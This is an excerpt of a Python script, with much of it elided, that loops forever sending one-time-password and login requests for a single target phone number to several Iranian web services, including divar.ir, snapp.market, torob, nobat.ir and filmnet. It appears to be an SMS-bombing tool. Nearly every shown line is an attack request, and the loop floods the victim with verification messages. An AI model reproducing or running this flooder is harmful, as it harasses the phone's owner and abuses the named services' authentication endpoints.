...
while True:
  ...
  req3=requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=payload3)
  ...
  req4=requests.post("https://api.divar.ir/v5/auth/authenticate",json=payload4)
  ...
  req7=requests.post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{cellphone}")
  ...
  req8=requests.get(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{cellphone}") 
  ...
  req12=requests.post(f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{cellphone}"%7D')   
  ...
  req13=requests.post("https://nobat.ir/api/public/patient/login/phone", json=payload10)
  ...
  req14=requests.get(f"https://filmnet.ir/api-v2/access-token/users/{cellphone}/otp")
  ...
  req16=requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile",json=payloa11)
